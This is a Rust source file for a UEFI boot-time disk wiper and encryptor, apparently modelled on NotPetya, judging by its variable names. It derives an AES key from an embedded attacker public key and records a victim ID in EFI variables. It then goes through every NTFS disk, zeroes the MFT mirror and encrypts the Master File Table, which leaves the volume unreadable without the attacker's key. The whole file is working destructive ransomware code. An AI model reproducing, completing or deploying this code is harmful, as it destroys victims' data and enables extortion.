use alloc::vec;
use alloc::vec::Vec;
use core::ops::Range;

use aes::cipher::{generic_array::GenericArray, BlockEncrypt, NewBlockCipher};
use aes::{Aes256, Block};
use rand::rngs::OsRng;
use uefi::prelude::SystemTable;
use uefi::proto::media::block::BlockIO;
use uefi::table::Boot;
use x25519_dalek::{EphemeralSecret, PublicKey};

use crate::efi::write_var;
use crate::efi::EfiRng;
use crate::ntfs::{get_data_runs, read_mft_entry, OEM_ID};

fn get_mft_ranges(
    blk: &mut BlockIO,
    media_id: u32,
    boot_sector: u64,
    buf: &mut [u8],
) -> uefi::Result<Vec<Range<u64>>> {
    // Read Boot Sector, which is the first sector of NTFS partition
    blk.read_blocks(media_id, boot_sector, buf)?;

    // Get start sector of $MFT and $MFTMirr from Boot Sector
    let mft_start = u64::from_ne_bytes(buf[48..56].try_into().unwrap());
    let mft_start = (mft_start * 8) + boot_sector;
    let mft_mir_start = u64::from_ne_bytes(buf[56..64].try_into().unwrap());
    let mft_mir_start = (mft_mir_start * 8) + boot_sector;

    // Destroy the $MFTMirr cluster, do it here cause it's only 8 sectors to overwrite
    let buf2 = [0u8; 512];
    for sector in mft_mir_start..mft_mir_start + 8 {
        blk.write_blocks(media_id, sector, &buf2)?;
    }

    // Prepare a buffer with the size of a file record entry
    let mut mft_entry_buf = [0u8; 1024];

    // Read the $MFT file record entry, which is the first entry of the MFT zone
    read_mft_entry(blk, media_id, mft_start, buf, &mut mft_entry_buf)?;

    let ranges = get_data_runs(&mft_entry_buf)?;

    // Write size of the first run into the volume serial number of boot sector
    let size: [u8; 8] = (ranges[0].end - ranges[0].start).to_ne_bytes();
    blk.read_blocks(media_id, boot_sector, buf)?;
    buf[72..80].copy_from_slice(&size);
    blk.write_blocks(media_id, boot_sector, buf)?;

    Ok(ranges)
}

/// Fire !
fn beat_the_shit_out_of_the_mft(
    blk: &mut BlockIO,
    media_id: u32,
    mft_runs: Vec<Range<u64>>,
    key_bytes: [u8; 32],
) -> uefi::Result {
    let mut buf = [0u8; 512];
    let key = GenericArray::from_slice(&key_bytes);
    let cipher = Aes256::new(key);
    let mut blocks: Vec<Block> = vec![];

    for run in mft_runs {
        for sector in run {
            if sector % 2 == 0 {
                blk.read_blocks(media_id, sector, &mut buf).unwrap();

                for chunk in buf.chunks(16) {
                    let mut block = Block::default();
                    block.copy_from_slice(chunk);
                    blocks.push(block);
                }

                cipher.encrypt_blocks(&mut blocks);

                for (i, block) in blocks.iter().enumerate() {
                    buf[16 * i..16 * i + 16].copy_from_slice(block.as_slice());
                }

                blocks.clear();

                blk.write_blocks(media_id, sector, &buf).unwrap();
            }
        }
    }

    Ok(())
}

fn write_test_file(st: &SystemTable<Boot>, key_bytes: &[u8; 32]) -> uefi::Result {
    let key = GenericArray::from_slice(key_bytes);
    let cipher = Aes256::new(key);

    let mut block = Block::default();
    block.copy_from_slice(b"slava ukraini   ");

    cipher.encrypt_block(&mut block);

    write_var(st, "NotPetyaAgainProof", block.as_slice())?;

    Ok(())
}

pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
    let public_key_hex = include_str!("include/public_key.hex");
    let mut buf = [0u8; 32];
    hex::decode_to_slice(public_key_hex, &mut buf).unwrap();
    let public_key = PublicKey::from(buf);

    let efi_rng = EfiRng::new(st);

    let secret = match efi_rng {
        Ok(rng) => EphemeralSecret::new(rng),
        Err(_) => EphemeralSecret::new(OsRng),
    };

    let id = PublicKey::from(&secret);
    let key = secret.diffie_hellman(&public_key);

    let mut buf = [0u8; 64];
    hex::encode_to_slice(id.as_bytes(), &mut buf).unwrap();
    write_var(st, "NotPetyaAgainId", &buf).unwrap();

    write_test_file(st, key.as_bytes())?;

    // Get list of handles which instantiate a BlockIO
    let handles = st.boot_services().find_handles::<BlockIO>()?;

    for handle in handles {
        let blk = st.boot_services().handle_protocol::<BlockIO>(handle)?;

        let blk = unsafe { &mut *blk.get() };
        let blk_media = blk.media();
        let media_id = blk_media.media_id();
        let block_size = blk_media.block_size();

        let mut buf = vec![0u8; block_size as usize];
        blk.read_blocks(media_id, 0, &mut buf)?;

        // If not a NTFS partition then get out
        if &buf[3..11] != OEM_ID {
            continue;
        }

        if let Ok(ranges) = get_mft_ranges(blk, media_id, 0, &mut buf) {
            beat_the_shit_out_of_the_mft(blk, media_id, ranges, key.to_bytes())?;
        }
    }

    Ok(())
}
